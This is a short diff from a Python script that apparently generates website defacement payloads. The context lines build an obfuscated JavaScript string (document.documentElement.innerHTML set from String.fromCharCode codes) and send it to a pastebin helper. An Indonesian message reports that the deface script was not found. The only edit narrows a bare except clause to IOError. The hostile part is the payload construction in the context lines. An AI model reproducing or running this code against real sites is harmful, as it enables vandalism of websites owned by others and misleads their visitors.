@@ -121,7 +121,7 @@ try:
 	jso = 'document.documentElement.innerHTML=String.fromCharCode(' + str(char) + ')'
 	pastebin(jso)
 
-except:
+except IOError:
 	print
 	print(A+'Script Deface Tidak Di Temukan !')
 	print
